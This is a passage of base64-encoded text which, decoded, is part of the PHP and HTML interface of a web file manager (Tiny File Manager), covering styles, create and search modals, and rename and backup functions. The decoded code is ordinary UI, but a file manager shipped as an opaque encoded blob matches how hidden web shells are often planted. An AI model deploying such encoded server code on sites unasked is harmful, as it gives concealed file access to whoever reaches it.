25hY2tiYXIgeyB2aXNpYmlsaXR5OmhpZGRlbjttaW4td2lkdGg6MjUwcHg7bWFyZ2luLWxlZnQ6LTEyNXB4O2JhY2tncm91bmQtY29sb3I6IzMzMztjb2xvcjojZmZmO3RleHQtYWxpZ246Y2VudGVyO2JvcmRlci1yYWRpdXM6MnB4O3BhZGRpbmc6MTZweDtwb3NpdGlvbjpmaXhlZDt6LWluZGV4OjE7bGVmdDo1MCU7Ym90dG9tOjMwcHg7Zm9udC1zaXplOjE3cHg7IH0KICAgICAgICAjc25hY2tiYXIuc2hvdyB7IHZpc2liaWxpdHk6dmlzaWJsZTstd2Via2l0LWFuaW1hdGlvbjpmYWRlaW4gMC41cywgZmFkZW91dCAwLjVzIDIuNXM7YW5pbWF0aW9uOmZhZGVpbiAwLjVzLCBmYWRlb3V0IDAuNXMgMi41czsgfQogICAgICAgIEAtd2Via2l0LWtleWZyYW1lcyBmYWRlaW4geyBmcm9tIHsgYm90dG9tOjA7b3BhY2l0eTowOyB9CiAgICAgICAgdG8geyBib3R0b206MzBweDtvcGFjaXR5OjE7IH0KICAgICAgICB9CiAgICAgICAgQGtleWZyYW1lcyBmYWRlaW4geyBmcm9tIHsgYm90dG9tOjA7b3BhY2l0eTowOyB9CiAgICAgICAgdG8geyBib3R0b206MzBweDtvcGFjaXR5OjE7IH0KICAgICAgICB9CiAgICAgICAgQC13ZWJraXQta2V5ZnJhbWVzIGZhZGVvdXQgeyBmcm9tIHsgYm90dG9tOjMwcHg7b3BhY2l0eToxOyB9CiAgICAgICAgdG8geyBib3R0b206MDtvcGFjaXR5OjA7IH0KICAgICAgICB9CiAgICAgICAgQGtleWZyYW1lcyBmYWRlb3V0IHsgZnJvbSB7IGJvdHRvbTozMHB4O29wYWNpdHk6MTsgfQogICAgICAgIHRvIHsgYm90dG9tOjA7b3BhY2l0eTowOyB9CiAgICAgICAgfQogICAgICAgICNtYWluLXRhYmxlIHNwYW4uYmFkZ2UgeyBib3JkZXItYm90dG9tOjJweCBzb2xpZCAjZjhmOWZhIH0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCgxKSB7IGJvcmRlci1jb2xvcjojZGY0MjI3IH0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCgyKSB7IGJvcmRlci1jb2xvcjojZjhiNjAwIH0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCgzKSB7IGJvcmRlci1jb2xvcjojMDBiZDYwIH0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCg0KSB7IGJvcmRlci1jb2xvcjojNDU4MWZmIH0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCg1KSB7IGJvcmRlci1jb2xvcjojYWM2OGZjIH0KICAgICAgICAjbWFpbi10YWJsZSBzcGFuLmJhZGdlOm50aC1jaGlsZCg2KSB7IGJvcmRlci1jb2xvcjojNDVjM2QyIH0KICAgICAgICBAbWVkaWEgb25seSBzY3JlZW4gYW5kIChtaW4tZGV2aWNlLXdpZHRoOjc2OHB4KSBhbmQgKG1heC1kZXZpY2Utd2lkdGg6MTAyNHB4KSBhbmQgKG9yaWVudGF0aW9uOmxhbmRzY2FwZSkgYW5kICgtd2Via2l0LW1pbi1kZXZpY2UtcGl4ZWwtcmF0aW86MikgeyAubmF2YmFyLWNvbGxhcHNlIC5jb2wteHMtNi50ZXh0LXJpZ2h0IHsgcGFkZGluZzowOyB9CiAgICAgICAgfQogICAgICAgIC5idG4uYWN0aXZlLmZvY3VzLC5idG4uYWN0aXZlOmZvY3VzLC5idG4uZm9jdXMsLmJ0bi5mb2N1czphY3RpdmUsLmJ0bjphY3RpdmU6Zm9jdXMsLmJ0bjpmb2N1cyB7IG91dGxpbmU6MCFpbXBvcnRhbnQ7b3V0bGluZS1vZmZzZXQ6MCFpbXBvcnRhbnQ7YmFja2dyb3VuZC1pbWFnZTpub25lIWltcG9ydGFudDstd2Via2l0LWJveC1zaGFkb3c6bm9uZSFpbXBvcnRhbnQ7Ym94LXNoYWRvdzpub25lIWltcG9ydGFudCB9CiAgICAgICAgLmxkcy1mYWNlYm9vayB7IGRpc3BsYXk6bm9uZTtwb3NpdGlvbjpyZWxhdGl2ZTt3aWR0aDo2NHB4O2hlaWdodDo2NHB4IH0KICAgICAgICAubGRzLWZhY2Vib29rIGRpdiwubGRzLWZhY2Vib29rLnNob3ctbWUgeyBkaXNwbGF5OmlubGluZS1ibG9jayB9CiAgICAgICAgLmxkcy1mYWNlYm9vayBkaXYgeyBwb3NpdGlvbjphYnNvbHV0ZTtsZWZ0OjZweDt3aWR0aDoxM3B4O2JhY2tncm91bmQ6IzAwN2JmZjthbmltYXRpb246bGRzLWZhY2Vib29rIDEuMnMgY3ViaWMtYmV6aWVyKDAsLjUsLjUsMSkgaW5maW5pdGUgfQogICAgICAgIC5sZHMtZmFjZWJvb2sgZGl2Om50aC1jaGlsZCgxKSB7IGxlZnQ6NnB4O2FuaW1hdGlvbi1kZWxheTotLjI0cyB9CiAgICAgICAgLmxkcy1mYWNlYm9vayBkaXY6bnRoLWNoaWxkKDIpIHsgbGVmdDoyNnB4O2FuaW1hdGlvbi1kZWxheTotLjEycyB9CiAgICAgICAgLmxkcy1mYWNlYm9vayBkaXY6bnRoLWNoaWxkKDMpIHsgbGVmdDo0NXB4O2FuaW1hdGlvbi1kZWxheTowIH0KICAgICAgICBAa2V5ZnJhbWVzIGxkcy1mYWNlYm9vayB7IDAlIHsgdG9wOjZweDtoZWlnaHQ6NTFweCB9CiAgICAgICAgMTAwJSw1MCUgeyB0b3A6MTlweDtoZWlnaHQ6MjZweCB9CiAgICAgICAgfQogICAgICAgIHVsI3NlYXJjaC13cmFwcGVyIHsgcGFkZGluZy1sZWZ0OiAwO2JvcmRlcjogMXB4IHNvbGlkICNlY2VjZWNjYzsgfSB1bCNzZWFyY2gtd3JhcHBlciBsaSB7IGxpc3Qtc3R5bGU6IG5vbmU7IHBhZGRpbmc6IDVweDtib3JkZXItYm90dG9tOiAxcHggc29saWQgI2VjZWNlY2NjOyB9CiAgICAgICAgdWwjc2VhcmNoLXdyYXBwZXIgbGk6bnRoLWNoaWxkKG9kZCl7IGJhY2tncm91bmQ6ICNmOWY5ZjljYzt9CiAgICAgICAgLmMtcHJldmlldy1pbWcgewogICAgICAgICAgICBtYXgtd2lkdGg6IDMwMHB4OwogICAgICAgIH0KICAgIDwvc3R5bGU+CiAgICA8P3BocAogICAgaWYgKEZNX1RIRU1FID09ICJkYXJrIik6ID8+CiAgICAgICAgPHN0eWxlPgogICAgICAgICAgICBib2R5LnRoZW1lLWRhcmsgeyBiYWNrZ3JvdW5kLWNvbG9yOiAjMmYyYTJhOyB9CiAgICAgICAgICAgIC5saXN0LWdyb3VwIC5saXN0LWdyb3VwLWl0ZW0geyBiYWNrZ3JvdW5kOiAjMzQzYTQwOyB9CiAgICAgICAgICAgIC50aGVtZS1kYXJrIC5uYXZiYXItbmF2IGksIC5uYXZiYXItbmF2IC5kcm9wZG93bi10b2dnbGUsIC5icmVhay13b3JkIHsgY29sb3I6ICNmZmZmZmY7IH0KICAgICAgICAgICAgYSwgYTpob3ZlciwgYTp2aXNpdGVkLCBhOmFjdGl2ZSwgI21haW4tdGFibGUgLmZpbGVuYW1lIGEgeyBjb2xvcjogIzAwZmYxZjsgfQogICAgICAgICAgICB1bCNzZWFyY2gtd3JhcHBlciBsaTpudGgtY2hpbGQob2RkKSB7IGJhY2tncm91bmQ6ICNmOWY5ZjljYzsgfQogICAgICAgICAgICAudGhlbWUtZGFyayAuYnRuLW91dGxpbmUtcHJpbWFyeSB7IGNvbG9yOiAjMDBmZjFmOyBib3JkZXItY29sb3I6ICMwMGZmMWY7IH0KICAgICAgICAgICAgLnRoZW1lLWRhcmsgLmJ0bi1vdXRsaW5lLXByaW1hcnk6aG92ZXIsIC50aGVtZS1kYXJrIC5idG4tb3V0bGluZS1wcmltYXJ5OmFjdGl2ZSB7IGJhY2tncm91bmQtY29sb3I6ICMwMjgyMTE7fQogICAgICAgIDwvc3R5bGU+CiAgICA8P3BocCBlbmRpZjsgPz4KPC9oZWFkPgo8Ym9keSBjbGFzcz0iPD9waHAgZWNobyAoRk1fVEhFTUUgPT0gImRhcmsiKSA/ICd0aGVtZS1kYXJrJyA6ICcnOyA/PiA8P3BocCBlY2hvICRpc1N0aWNreU5hdkJhcjsgPz4iPgo8ZGl2IGlkPSJ3cmFwcGVyIiBjbGFzcz0iY29udGFpbmVyLWZsdWlkIj4KCiAgICA8IS0tIE5ldyBJdGVtIGNyZWF0aW9uIC0tPgogICAgPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9ImNyZWF0ZU5ld0l0ZW0iIHRhYmluZGV4PSItMSIgcm9sZT0iZGlhbG9nIiBhcmlhLWxhYmVsPSJuZXdJdGVtTW9kYWxMYWJlbCIgYXJpYS1oaWRkZW49InRydWUiPgogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyIgcm9sZT0iZG9jdW1lbnQiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50IDw/cGhwIGVjaG8gZm1fZ2V0X3RoZW1lKCk7ID8+Ij4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWhlYWRlciI+CiAgICAgICAgICAgICAgICAgICAgPGg1IGNsYXNzPSJtb2RhbC10aXRsZSIgaWQ9Im5ld0l0ZW1Nb2RhbExhYmVsIj48aSBjbGFzcz0iZmEgZmEtcGx1cy1zcXVhcmUgZmEtZnciPjwvaT48P3BocCBlY2hvIGxuZygnQ3JlYXRlTmV3SXRlbScpID8+PC9oNT4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImNsb3NlIiBkYXRhLWRpc21pc3M9Im1vZGFsIiBhcmlhLWxhYmVsPSJDbG9zZSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuIGFyaWEtaGlkZGVuPSJ0cnVlIj4mdGltZXM7PC9zcGFuPgogICAgICAgICAgICAgICAgICAgIDwvYnV0dG9uPgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1ib2R5Ij4KICAgICAgICAgICAgICAgICAgICA8cD48bGFiZWwgZm9yPSJuZXdmaWxlIj48P3BocCBlY2hvIGxuZygnSXRlbVR5cGUnKSA/PiA8L2xhYmVsPjwvcD4KCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wgY3VzdG9tLXJhZGlvIGN1c3RvbS1jb250cm9sLWlubGluZSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgaWQ9ImN1c3RvbVJhZGlvSW5saW5lMSIgbmFtZT0ibmV3ZmlsZSIgdmFsdWU9ImZpbGUiIGNsYXNzPSJjdXN0b20tY29udHJvbC1pbnB1dCI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxsYWJlbCBjbGFzcz0iY3VzdG9tLWNvbnRyb2wtbGFiZWwiIGZvcj0iY3VzdG9tUmFkaW9JbmxpbmUxIj48P3BocCBlY2hvIGxuZygnRmlsZScpID8+PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY3VzdG9tLWNvbnRyb2wgY3VzdG9tLXJhZGlvIGN1c3RvbS1jb250cm9sLWlubGluZSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJyYWRpbyIgaWQ9ImN1c3RvbVJhZGlvSW5saW5lMiIgbmFtZT0ibmV3ZmlsZSIgdmFsdWU9ImZvbGRlciIgY2xhc3M9ImN1c3RvbS1jb250cm9sLWlucHV0IiBjaGVja2VkPSIiPgogICAgICAgICAgICAgICAgICAgICAgICA8bGFiZWwgY2xhc3M9ImN1c3RvbS1jb250cm9sLWxhYmVsIiBmb3I9ImN1c3RvbVJhZGlvSW5saW5lMiI+PD9waHAgZWNobyBsbmcoJ0ZvbGRlcicpID8+PC9sYWJlbD4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KCiAgICAgICAgICAgICAgICAgICAgPHAgY2xhc3M9Im10LTMiPjxsYWJlbCBmb3I9Im5ld2ZpbGVuYW1lIj48P3BocCBlY2hvIGxuZygnSXRlbU5hbWUnKSA/PiA8L2xhYmVsPjwvcD4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibmV3ZmlsZW5hbWUiIGlkPSJuZXdmaWxlbmFtZSIgdmFsdWU9IiIgY2xhc3M9ImZvcm0tY29udHJvbCI+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWZvb3RlciI+CiAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJidG4gYnRuLW91dGxpbmUtcHJpbWFyeSIgZGF0YS1kaXNtaXNzPSJtb2RhbCI+PGkgY2xhc3M9ImZhIGZhLXRpbWVzLWNpcmNsZSI+PC9pPiA8P3BocCBlY2hvIGxuZygnQ2FuY2VsJykgPz48L2J1dHRvbj4KICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tc3VjY2VzcyIgb25jbGljaz0ibmV3Zm9sZGVyKCc8P3BocCBlY2hvIGZtX2VuYyhGTV9QQVRIKSA/PicpO3JldHVybiBmYWxzZTsiPjxpIGNsYXNzPSJmYSBmYS1jaGVjay1jaXJjbGUiPjwvaT4gPD9waHAgZWNobyBsbmcoJ0NyZWF0ZU5vdycpID8+PC9idXR0b24+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgPC9kaXY+CiAgICA8L2Rpdj4KCiAgICA8IS0tIE1vZGFsIC0tPgogICAgPGRpdiBjbGFzcz0ibW9kYWwgZmFkZSIgaWQ9InNlYXJjaE1vZGFsIiB0YWJpbmRleD0iLTEiIHJvbGU9ImRpYWxvZyIgYXJpYS1sYWJlbGxlZGJ5PSJzZWFyY2hNb2RhbExhYmVsIiBhcmlhLWhpZGRlbj0idHJ1ZSI+CiAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWRpYWxvZyBtb2RhbC1sZyIgcm9sZT0iZG9jdW1lbnQiPgogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsLWNvbnRlbnQgPD9waHAgZWNobyBmbV9nZXRfdGhlbWUoKTsgPz4iPgogICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtaGVhZGVyIj4KICAgICAgICAgICAgPGg1IGNsYXNzPSJtb2RhbC10aXRsZSBjb2wtMTAiIGlkPSJzZWFyY2hNb2RhbExhYmVsIj4KICAgICAgICAgICAgICAgIDxkaXYgY2xhc3M9ImlucHV0LWdyb3VwIGlucHV0LWdyb3VwIj4KICAgICAgICAgICAgICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgY2xhc3M9ImZvcm0tY29udHJvbCIgcGxhY2Vob2xkZXI9Ijw/cGhwIGVjaG8gbG5nKCdTZWFyY2gnKSA/PiBhIGZpbGVzIiBhcmlhLWxhYmVsPSI8P3BocCBlY2hvIGxuZygnU2VhcmNoJykgPz4iIGFyaWEtZGVzY3JpYmVkYnk9InNlYXJjaC1hZGRvbjMiIGlkPSJhZHZhbmNlZC1zZWFyY2giIGF1dG9mb2N1cyByZXF1aXJlZD4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJpbnB1dC1ncm91cC1hcHBlbmQiPgogICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0iaW5wdXQtZ3JvdXAtdGV4dCIgaWQ9InNlYXJjaC1hZGRvbjMiPjxpIGNsYXNzPSJmYSBmYS1zZWFyY2giPjwvaT48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9oNT4KICAgICAgICAgICAgPGJ1dHRvbiB0eXBlPSJidXR0b24iIGNsYXNzPSJjbG9zZSIgZGF0YS1kaXNtaXNzPSJtb2RhbCIgYXJpYS1sYWJlbD0iQ2xvc2UiPgogICAgICAgICAgICAgIDxzcGFuIGFyaWEtaGlkZGVuPSJ0cnVlIj4mdGltZXM7PC9zcGFuPgogICAgICAgICAgICA8L2J1dHRvbj4KICAgICAgICAgIDwvZGl2PgogICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtYm9keSI+CiAgICAgICAgICAgIDxmb3JtIGFjdGlvbj0iIiBtZXRob2Q9InBvc3QiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibGRzLWZhY2Vib29rIj48ZGl2PjwvZGl2PjxkaXY+PC9kaXY+PGRpdj48L2Rpdj48L2Rpdj4KICAgICAgICAgICAgICAgIDx1bCBpZD0ic2VhcmNoLXdyYXBwZXIiPgogICAgICAgICAgICAgICAgICAgIDxwIGNsYXNzPSJtLTIiPlNlYXJjaCBmaWxlIGluIGZvbGRlciBhbmQgc3ViZm9sZGVycy4uLjwvcD4KICAgICAgICAgICAgICAgIDwvdWw+CiAgICAgICAgICAgIDwvZm9ybT4KICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgICA8L2Rpdj4KICAgIDwvZGl2PgogICAgPHNjcmlwdCB0eXBlPSJ0ZXh0L2h0bWwiIGlkPSJqcy10cGwtbW9kYWwiPgogICAgICAgIDxkaXYgY2xhc3M9Im1vZGFsIGZhZGUiIGlkPSJqcy1Nb2RhbENlbnRlci08JXRoaXMuaWQlPiIgdGFiaW5kZXg9Ii0xIiByb2xlPSJkaWFsb2ciIGFyaWEtbGFiZWxsZWRieT0iTW9kYWxDZW50ZXJUaXRsZSIgYXJpYS1oaWRkZW49InRydWUiPgogICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1kaWFsb2cgbW9kYWwtZGlhbG9nLWNlbnRlcmVkIiByb2xlPSJkb2N1bWVudCI+CiAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1jb250ZW50Ij4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1oZWFkZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8aDUgY2xhc3M9Im1vZGFsLXRpdGxlIiBpZD0iTW9kYWxDZW50ZXJUaXRsZSI+PCV0aGlzLnRpdGxlJT48L2g1PgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImNsb3NlIiBkYXRhLWRpc21pc3M9Im1vZGFsIiBhcmlhLWxhYmVsPSJDbG9zZSI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBhcmlhLWhpZGRlbj0idHJ1ZSI+JnRpbWVzOzwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0ibW9kYWwtYm9keSI+CiAgICAgICAgICAgICAgICAgICAgICAgIDwldGhpcy5jb250ZW50JT4KICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJtb2RhbC1mb290ZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8YnV0dG9uIHR5cGU9ImJ1dHRvbiIgY2xhc3M9ImJ0biBidG4tb3V0bGluZS1wcmltYXJ5IiBkYXRhLWRpc21pc3M9Im1vZGFsIj48aSBjbGFzcz0iZmEgZmEtdGltZXMtY2lyY2xlIj48L2k+IDw/cGhwIGVjaG8gbG5nKCdDYW5jZWwnKSA/PjwvYnV0dG9uPgogICAgICAgICAgICAgICAgICAgICAgICA8JWlmKHRoaXMuYWN0aW9uKXslPjxidXR0b24gdHlwZT0iYnV0dG9uIiBjbGFzcz0iYnRuIGJ0bi1wcmltYXJ5IiBpZD0ianMtTW9kYWxDZW50ZXJBY3Rpb24iIGRhdGEtdHlwZT0ianMtPCV0aGlzLmFjdGlvbiU+Ij48JXRoaXMuYWN0aW9uJT48L2J1dHRvbj48JX0lPgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgIDwvZGl2PgogICAgICAgIDwvZGl2PgogICAgPC9zY3JpcHQ+CgogICAgPD9waHAKICAgIH0KCiAgICAvKioKICAgICAqIFNob3cgcGFnZSBmb290ZXIKICAgICAqLwogICAgZnVuY3Rpb24gZm1fc2hvd19mb290ZXIoKQogICAgewogICAgPz4KPC9kaXY+CjxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9saWJzL2pxdWVyeS8zLjUuMS9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vc3RhY2twYXRoLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuNS4wL2pzL2Jvb3RzdHJhcC5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG4uZGF0YXRhYmxlcy5uZXQvMS4xMC4yMS9qcy9qcXVlcnkuZGF0YVRhYmxlcy5taW4uanMiPjwvc2NyaXB0Pgo8c2NyaXB0IHNyYz0iaHR0cHM6Ly9jZG5qcy5jbG91ZGZsYXJlLmNvbS9hamF4L2xpYnMvZWtrby1saWdodGJveC81LjMuMC9la2tvLWxpZ2h0Ym94Lm1pbi5qcyI+PC9zY3JpcHQ+Cjw/cGhwIGlmIChGTV9VU0VfSElHSExJR0hUSlMpOiA/PgogICAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuanMuY2xvdWRmbGFyZS5jb20vYWpheC9saWJzL2hpZ2hsaWdodC5qcy8xMC4wLjMvaGlnaGxpZ2h0Lm1pbi5qcyI+PC9zY3JpcHQ+CiAgICA8c2NyaXB0PmhsanMuaW5pdEhpZ2hsaWdodGluZ09uTG9hZCgpOyB2YXIgaXNIaWdobGlnaHRpbmdFbmFibGVkID0gdHJ1ZTs8L3NjcmlwdD4KPD9waHAgZW5kaWY7ID8+CjxzY3JpcHQ+CiAgICAkKGRvY3VtZW50KS5vbignY2xpY2snLCAnW2RhdGEtdG9nZ2xlPSJsaWdodGJveCJdJywgZnVuY3Rpb24oZXZlbnQpIHsKICAgICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwogICAgICAgIHZhciByZUluaXRIaWdobGlnaHQgPSBmdW5jdGlvbigpIHsgaWYodHlwZW9mIGlzSGlnaGxpZ2h0aW5nRW5hYmxlZCAhPT0gInVuZGVmaW5lZCIgJiYgaXNIaWdobGlnaHRpbmdFbmFibGVkKSB7IHNldFRpbWVvdXQoZnVuY3Rpb24gKCkgeyAkKCcuZWtrby1saWdodGJveC1jb250YWluZXIgcHJlIGNvZGUnKS5lYWNoKGZ1bmN0aW9uIChpLCBlKSB7IGhsanMuaGlnaGxpZ2h0QmxvY2soZSkgfSk7IH0sIDU1NSk7IH0gfTsKICAgICAgICAkKHRoaXMpLmVra29MaWdodGJveCh7CiAgICAgICAgICAgIGFsd2F5c1Nob3dDbG9zZTogdHJ1ZSwgc2hvd0Fycm93czogdHJ1ZSwgb25TaG93bjogZnVuY3Rpb24oKSB7IHJlSW5pdEhpZ2hsaWdodCgpOyB9LCBvbk5hdmlnYXRlOiBmdW5jdGlvbihkaXJlY3Rpb24sIGl0ZW1JbmRleCkgeyByZUluaXRIaWdobGlnaHQoKTsgfQogICAgICAgIH0pOwogICAgfSk7CiAgICAvL1RGTSBDb25maWcKICAgIHdpbmRvdy5jdXJpID0gImh0dHBzOi8vdGlueWZpbGVtYW5hZ2VyLmdpdGh1Yi5pby9jb25maWcuanNvbiIsIHdpbmRvdy5jb25maWcgPSBudWxsOwogICAgZnVuY3Rpb24gZm1fZ2V0X2NvbmZpZygpeyBpZighIXdpbmRvdy5uYW1lKXsgd2luZG93LmNvbmZpZyA9IEpTT04ucGFyc2Uod2luZG93Lm5hbWUpOyB9IGVsc2UgeyAkLmdldEpTT04od2luZG93LmN1cmkpLmRvbmUoZnVuY3Rpb24oYykgeyBpZighIWMpIHsgd2luZG93Lm5hbWUgPSBKU09OLnN0cmluZ2lmeShjKSwgd2luZG93LmNvbmZpZyA9IGM7IH0gfSk7IH19CiAgICBmdW5jdGlvbiB0ZW1wbGF0ZShodG1sLG9wdGlvbnMpewogICAgICAgIHZhciByZT0vPFwlKFteXCU+XSspP1wlPi9nLHJlRXhwPS8oXiggKT8oaWZ8Zm9yfGVsc2V8c3dpdGNofGNhc2V8YnJlYWt8e3x9KSkoLiopPy9nLGNvZGU9J3ZhciByPVtdO1xuJyxjdXJzb3I9MCxtYXRjaDt2YXIgYWRkPWZ1bmN0aW9uKGxpbmUsanMpe2pzPyhjb2RlKz1saW5lLm1hdGNoKHJlRXhwKT9saW5lKydcbic6J3IucHVzaCgnK2xpbmUrJyk7XG4nKTooY29kZSs9bGluZSE9Jyc/J3IucHVzaCgiJytsaW5lLnJlcGxhY2UoLyIvZywnXFwiJykrJyIpO1xuJzonJyk7cmV0dXJuIGFkZH0KICAgICAgICB3aGlsZShtYXRjaD1yZS5leGVjKGh0bWwpKXthZGQoaHRtbC5zbGljZShjdXJzb3IsbWF0Y2guaW5kZXgpKShtYXRjaFsxXSwhMCk7Y3Vyc29yPW1hdGNoLmluZGV4K21hdGNoWzBdLmxlbmd0aH0KICAgICAgICBhZGQoaHRtbC5zdWJzdHIoY3Vyc29yLGh0bWwubGVuZ3RoLWN1cnNvcikpO2NvZGUrPSdyZXR1cm4gci5qb2luKCIiKTsnO3JldHVybiBuZXcgRnVuY3Rpb24oY29kZS5yZXBsYWNlKC9bXHJcdFxuXS9nLCcnKSkuYXBwbHkob3B0aW9ucykKICAgIH0KICAgIGZ1bmN0aW9uIG5ld2ZvbGRlcihlKSB7CiAgICAgICAgdmFyIHQgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibmV3ZmlsZW5hbWUiKS52YWx1ZSwgbiA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2lucHV0W25hbWU9Im5ld2ZpbGUiXTpjaGVja2VkJykudmFsdWU7CiAgICAgICAgbnVsbCAhPT0gdCAmJiAiIiAhPT0gdCAmJiBuICYmICh3aW5kb3cubG9jYXRpb24uaGFzaCA9ICIjIiwgd2luZG93LmxvY2F0aW9uLnNlYXJjaCA9ICJwPSIgKyBlbmNvZGVVUklDb21wb25lbnQoZSkgKyAiJm5ldz0iICsgZW5jb2RlVVJJQ29tcG9uZW50KHQpICsgIiZ0eXBlPSIgKyBlbmNvZGVVUklDb21wb25lbnQobikpCiAgICB9CiAgICBmdW5jdGlvbiByZW5hbWUoZSwgdCkge3ZhciBuID0gcHJvbXB0KCJOZXcgbmFtZSIsIHQpO251bGwgIT09IG4gJiYgIiIgIT09IG4gJiYgbiAhPSB0ICYmICh3aW5kb3cubG9jYXRpb24uc2VhcmNoID0gInA9IiArIGVuY29kZVVSSUNvbXBvbmVudChlKSArICImcmVuPSIgKyBlbmNvZGVVUklDb21wb25lbnQodCkgKyAiJnRvPSIgKyBlbmNvZGVVUklDb21wb25lbnQobikpfQogICAgZnVuY3Rpb24gY2hhbmdlX2NoZWNrYm94ZXMoZSwgdCkgeyBmb3IgKHZhciBuID0gZS5sZW5ndGggLSAxOyBuID49IDA7IG4tLSkgZVtuXS5jaGVja2VkID0gImJvb2xlYW4iID09IHR5cGVvZiB0ID8gdCA6ICFlW25dLmNoZWNrZWQgfQogICAgZnVuY3Rpb24gZ2V0X2NoZWNrYm94ZXMoKSB7IGZvciAodmFyIGUgPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5TmFtZSgiZmlsZVtdIiksIHQgPSBbXSwgbiA9IGUubGVuZ3RoIC0gMTsgbiA+PSAwOyBuLS0pIChlW25dLnR5cGUgPSAiY2hlY2tib3giKSAmJiB0LnB1c2goZVtuXSk7IHJldHVybiB0IH0KICAgIGZ1bmN0aW9uIHNlbGVjdF9hbGwoKSB7IGNoYW5nZV9jaGVja2JveGVzKGdldF9jaGVja2JveGVzKCksICEwKSB9CiAgICBmdW5jdGlvbiB1bnNlbGVjdF9hbGwoKSB7IGNoYW5nZV9jaGVja2JveGVzKGdldF9jaGVja2JveGVzKCksICExKSB9CiAgICBmdW5jdGlvbiBpbnZlcnRfYWxsKCkgeyBjaGFuZ2VfY2hlY2tib3hlcyhnZXRfY2hlY2tib3hlcygpKSB9CiAgICBmdW5jdGlvbiBjaGVja2JveF90b2dnbGUoKSB7IHZhciBlID0gZ2V0X2NoZWNrYm94ZXMoKTsgZS5wdXNoKHRoaXMpLCBjaGFuZ2VfY2hlY2tib3hlcyhlKSB9CiAgICBmdW5jdGlvbiBiYWNrdXAoZSwgdCkgeyAvL0NyZWF0ZSBmaWxlIGJhY2t1cCB3aXRoIC5iY2sKICAgICAgICB2YXIgbiA9IG5ldyBYTUxIdHRwUmVxdWVzdCwKICAgICAgICAgICAgYSA9ICJwYXRoPSIgKyBlICsgIiZmaWxlPSIgKyB0ICsgIiZ0eXBlPWJhY2t1cCZhamF4PXRydWUiOwo